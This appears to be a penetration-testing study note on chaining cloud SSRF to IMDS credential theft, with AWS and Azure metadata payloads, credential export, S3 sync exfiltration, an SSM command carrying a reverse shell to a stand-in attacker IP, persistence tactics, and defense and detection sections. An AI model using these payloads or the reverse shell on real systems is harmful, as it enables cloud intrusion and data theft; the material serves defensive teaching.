---
tags: [cloud, ssrf, credential-theft, imds, aws, azure, pentesting]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.27 Cloud SSRF Chain"
---

# 27 - Cloud SSRF to Credential Theft — Full Chain

## Introduction: The Anatomy of a Cloud SSRF Breach

Server-Side Request Forgery (SSRF) has historically been a critical vulnerability in traditional web applications, allowing attackers to scan internal networks or bypass firewalls. However, in modern cloud environments, SSRF is widely considered the most devastating web vulnerability possible. 

In the cloud, an SSRF vulnerability acts as a direct bridge between the external internet and the internal Instance Metadata Service (IMDS). If an attacker can force a cloud-hosted application to make an HTTP request to `169.254.169.254`, they can extract the temporary IAM (Identity and Access Management) credentials assigned to the underlying virtual machine, container, or serverless function.

This note details the full, end-to-end attack chain: from discovering the SSRF, extracting credentials, evading detection, and finally executing post-exploitation lateral movement to compromise the entire cloud environment. 

## The Attack Chain Architecture

The following ASCII diagram illustrates the full lifecycle of a Cloud SSRF to Credential Theft attack, mirroring high-profile real-world breaches like the Capital One incident.

```text
Phase 1: External Attack       Phase 2: SSRF & IMDS Access      Phase 3: Post-Exploitation
+--------------------+         +------------------------+       +-------------------------+
|                    |         |   Target EC2/VM        |       |   Cloud Environment     |
|   Attacker         |  SSRF   |------------------------|       |-------------------------|
|   (Kali Linux)     | ======> | Vuln App (e.g. proxy)  |       | - S3 Buckets / Storage  |
|                    | Payload |                        |       | - RDS / Databases       |
+--------------------+         +-----------+------------+       | - IAM / Active Directory|
          ^                                |                    +-------------------------+
          |                                |                                ^
          | Credentials              GET 169.254.169.254                    |
          | Returned                       |                                |
          |                                v                                |
+--------------------+         +------------------------+                   |
|                    |         |   Cloud Metadata       |                   |
| Attacker uses keys |         |   Service (IMDS)       |                   |
| to configure CLI   |         |------------------------|                   |
| and pivots via API | <====== | Returns JSON with IAM  |                   |
|                    |         | AccessKey, Secret,     |                   |
+--------------------+         | and Session Token      |                   |
          |                    +------------------------+                   |
          |                                                                 |
          +=================================================================+
                   Attacker makes API calls using stolen credentials
```

## Phase 1: Vulnerability Discovery and Payload Crafting

The chain begins with identifying an SSRF vulnerability. This typically occurs in application features that fetch external resources based on user input, such as:
- Webhooks or callback URLs.
- Image fetching or PDF generation services.
- URL preview generators.
- XML external entity (XXE) injection points.

### Crafting the Payload

The attacker's initial goal is to verify the SSRF and determine the cloud provider.
They might start with a simple ping to an attacker-controlled Burp Collaborator or RequestBin. Once SSRF is confirmed, they pivot to the IMDS IP: `169.254.169.254`.

If the target is AWS (IMDSv1), the payload is simple:
```http
POST /api/fetch-image HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

If the target is Azure, the attacker must find a way to inject the `Metadata: true` header. If the SSRF is a blind or simple URL fetch without header control, Azure's IMDS is largely protected. However, if the SSRF exists in a highly configurable proxy or webhook engine, they might inject it:
```json
{
  "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
  "headers": {"Metadata": "true"}
}
```

*For advanced bypasses of AWS IMDSv2, refer to `[[25 - IMDSv2 Bypass Techniques]]`.*

## Phase 2: Credential Extraction and Ingestion

Assume the target is AWS IMDSv1. The initial request to `/security-credentials/` returns the name of the IAM role attached to the EC2 instance, for example: `web-app-production-role`.

The attacker appends this role name to the URL to fetch the actual credentials:
```http
http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-production-role
```

The application proxies this request, and the IMDS returns a JSON payload:
```json
{
  "Code" : "Success",
  "LastUpdated" : "2026-06-09T10:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "IQoJb3JpZ2luX2Vj...",
  "Expiration" : "2026-06-09T16:00:00Z"
}
```
*(Crucial Note: Credentials starting with `ASIA` indicate temporary credentials that require the `Token` field. Permanent keys start with `AKIA`).*

The attacker now has the keys to the kingdom—or at least, the keys to whatever that specific EC2 instance is allowed to access.

### Ingesting the Credentials Locally

The attacker exports these credentials into their local environment to interact directly with the Cloud API, bypassing the web application entirely.

```bash
export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG..."
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2Vj..."

# Verify the identity
aws sts get-caller-identity
```

## Phase 3: Enumeration and Post-Exploitation

With API access established, the attacker transitions from web exploitation to cloud infrastructure enumeration. They utilize tools discussed in `[[26 - Cloud Enumeration Tools]]`, such as Pacu or ScoutSuite.

### Step 3a: Identifying Permissions
The attacker runs `pacu` to determine the permissions of the compromised role.
Often, developers attach the `AmazonS3FullAccess` or `AdministratorAccess` managed policies to EC2 roles out of convenience.

### Step 3b: Data Exfiltration (The Capital One Scenario)
If the role has S3 access, the attacker will list all buckets and begin exfiltrating sensitive data.
```bash
# List all buckets
aws s3 ls

# Sync a bucket to the local attacker machine
aws s3 sync s3://company-production-database-backups /tmp/exfil/
```
In the famous Capital One breach, a misconfigured WAF suffered from SSRF. The attacker queried the AWS IMDS, extracted the role credentials, and used those credentials to sync thousands of S3 buckets containing credit card applications to their local machine.

### Step 3c: Privilege Escalation and Lateral Movement
If the compromised role doesn't have direct access to sensitive data, the attacker will look for Privilege Escalation vectors.
- Can this role modify IAM policies? (`iam:PutRolePolicy`)
- Can this role pass itself to a new EC2 instance? (`iam:PassRole` and `ec2:RunInstances`)
- Can this role invoke Lambda functions or modify Systems Manager (SSM) Run Commands?

If the attacker has `ssm:SendCommand` privileges, they can achieve Remote Code Execution on *other* EC2 instances in the account without needing network access or SSH keys.
```bash
aws ssm send-command \
    --document-name "AWS-RunShellScript" \
    --targets "Key=instanceids,Values=i-0123456789abcdef0" \
    --parameters 'commands=["bash -i >& /dev/tcp/attacker-ip/4444 0>&1"]'
```

## Phase 4: Persistence and Covering Tracks

Temporary IMDS credentials expire (usually after 6 hours). To maintain access, the attacker must establish persistence.

1. **Creating IAM Users**: If the role has `iam:CreateUser` permissions, the attacker creates a backdoor IAM user with long-term `AKIA` access keys.
2. **Modifying Security Groups**: The attacker modifies EC2 security groups to allow inbound SSH/RDP from their IP address.
3. **Lambda Backdoors**: Deploying a malicious Lambda function that triggers on specific API events to exfiltrate data continuously.

## Defense and Mitigation

Defending against the SSRF chain requires a defense-in-depth approach spanning the application, network, and IAM layers.

1. **Enforce IMDSv2**: This is the single most effective mitigation for AWS. IMDSv2 mitigates simple SSRF by requiring a `PUT` request and specific headers.
2. **Network Level Blocking (iptables/Network Policies)**: Use host-based firewalls to block the application user (e.g., `www-data`) from routing traffic to `169.254.169.254`. Only the root user or specific agents should access metadata.
3. **Application Level Validation**: Fix the SSRF. Implement strict allowlists for outbound URLs. Never trust user input for URL fetching.
4. **Principle of Least Privilege (IAM)**: EC2 instances should *never* have `AdministratorAccess`. If an EC2 instance only needs to write to one specific S3 bucket, its IAM policy should be restricted to `s3:PutObject` on that specific ARN. If SSRF occurs, the blast radius is contained.

## Detection Engineering

Detecting this attack chain requires analyzing CloudTrail logs and VPC Flow Logs.

- **The "Impossible Travel" / IP Mismatch Alert**: This is the highest-fidelity alert for IMDS credential theft. Temporary credentials generated by an EC2 instance are tied to the EC2's IAM role. If those credentials are used to make API calls from an external IP address (the attacker's home IP), an alert must fire immediately. AWS GuardDuty provides this out-of-the-box as `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`.
- **Anomalous API Calls**: Alert on EC2 roles making calls to `iam:ListUsers`, `sts:GetCallerIdentity`, or `s3:ListAllMyBuckets` if that is outside their normal behavior profile.
- **WAF Rules**: Block incoming requests containing the IMDS IP or common metadata endpoints in the URI or body payload.

## Chaining Opportunities

- **Initial Access**: Relies heavily on understanding `[[24 - Cloud Metadata Endpoint Cheat Sheet]]` and `[[25 - IMDSv2 Bypass Techniques]]`.
- **Enumeration**: Transitions immediately into `[[26 - Cloud Enumeration Tools]]` once credentials are stolen.
- **Azure Variant**: If targeting Azure, this chain links directly into `[[23 - Azure Managed Identity Abuse]]`.

## Deep Dive: Advanced Real-World Scenarios and Case Studies

In advanced penetration testing engagements, simplistic vulnerabilities are rarely found in isolation. Instead, attackers must chain multiple low-severity issues to achieve critical impact. The complexity of modern cloud architectures often obscures these attack paths from defenders, while providing numerous opportunities for patient adversaries.

Consider a scenario where an organization implements strict IAM policies but neglects network-level egress controls. An attacker might exploit a minor Server-Side Request Forgery (SSRF) vulnerability that, due to strict IAM, yields a token with seemingly useless permissions. However, by thoroughly enumerating the environment using tools discussed previously, the attacker discovers an obscure, legacy API endpoint internal to the VPC. This endpoint, trusting any request originating from within the network, allows the attacker to manipulate database records.

This illustrates a fundamental principle in cloud security: identity is the new perimeter, but network controls still provide critical defense-in-depth. A failure in either domain can lead to a complete compromise.

Furthermore, the operational tempo of cloud deployments—where Infrastructure as Code (IaC) pipelines deploy changes multiple times a day—frequently introduces transient vulnerabilities. A permission granted temporarily for debugging might be accidentally committed to the main branch, exposing a highly privileged role for just a few hours. Advanced adversaries automate their reconnaissance to detect and exploit these fleeting windows of opportunity.

To combat this, defensive teams must adopt an "assume breach" mentality. This means implementing continuous monitoring of control plane logs (like AWS CloudTrail or Azure Activity Logs), utilizing anomaly detection to spot unusual API call patterns, and conducting regular red team exercises to validate the effectiveness of security controls. The notes in this module provide the offensive perspective necessary to design these robust, resilient cloud architectures.

### The Role of Infrastructure as Code (IaC) in Security Posture

Modern cloud infrastructure is almost entirely defined by code using tools like Terraform, Pulumi, or AWS CloudFormation. While IaC brings immense benefits in terms of reproducibility and scale, it also codifies vulnerabilities if not properly secured. A single misconfiguration in a Terraform module—such as overly permissive security group rules or an exposed storage bucket—can be replicated across dozens of environments instantly.

During penetration tests, gaining access to the IaC repository is often a critical objective. Analyzing the code provides a comprehensive map of the target environment without needing to interact with the cloud provider's APIs, avoiding detection by logging mechanisms like CloudTrail. Furthermore, identifying hardcoded credentials or overly broad IAM roles within the IaC code can highlight direct paths to privilege escalation.

Securing IaC requires integrating security scanning tools directly into the CI/CD pipeline. Solutions like Checkov, tfsec, or OPA (Open Policy Agent) can automatically enforce security policies and block deployments that violate organizational standards. By shifting security left and addressing vulnerabilities at the code level, organizations can prevent misconfigurations from ever reaching production environments.

### Zero Trust Architecture in the Cloud

The concept of Zero Trust is fundamental to modern cloud security. Unlike traditional perimeter-based security models, Zero Trust assumes that the network is always hostile and that internal traffic is no more trustworthy than external traffic. Every request must be authenticated, authorized, and continuously validated, regardless of its origin.

In the context of cloud infrastructure, implementing Zero Trust involves several key practices:
- **Micro-segmentation:** Dividing the cloud environment into small, isolated zones to limit lateral movement in the event of a breach.
- **Identity-Aware Proxy (IAP):** Using a proxy to verify the identity and context of every request before granting access to internal applications.
- **Continuous Monitoring:** Analyzing logs and network traffic in real-time to detect anomalous behavior and respond to threats quickly.
- **Just-in-Time (JIT) Access:** Granting privileges only when they are needed and revoking them immediately after the task is completed, minimizing the window of opportunity for an attacker.

By adopting a Zero Trust mindset, organizations can significantly enhance their resilience against advanced threats and minimize the impact of potential security incidents.

### Summary of the Threat Landscape

The cloud threat landscape is constantly evolving, with attackers continually developing new techniques to bypass security controls. As cloud environments become more complex, the potential attack surface expands, making it increasingly challenging to secure.

Organizations must stay vigilant and continuously adapt their security posture to address emerging threats. This requires a proactive approach, incorporating regular security assessments, penetration testing, and threat modeling. By understanding the tactics, techniques, and procedures (TTPs) used by adversaries, defenders can implement targeted mitigations and improve their overall security posture.

Ultimately, cloud security is a shared responsibility between the cloud provider and the customer. While the provider is responsible for securing the underlying infrastructure, the customer is responsible for securing their applications, data, and configurations. Understanding this shared responsibility model is essential for designing and maintaining a secure cloud environment.

## Related Notes

- `[[24 - Cloud Metadata Endpoint Cheat Sheet]]`
- `[[25 - IMDSv2 Bypass Techniques]]`
- `[[26 - Cloud Enumeration Tools]]`
- `[[23 - Azure Managed Identity Abuse]]`
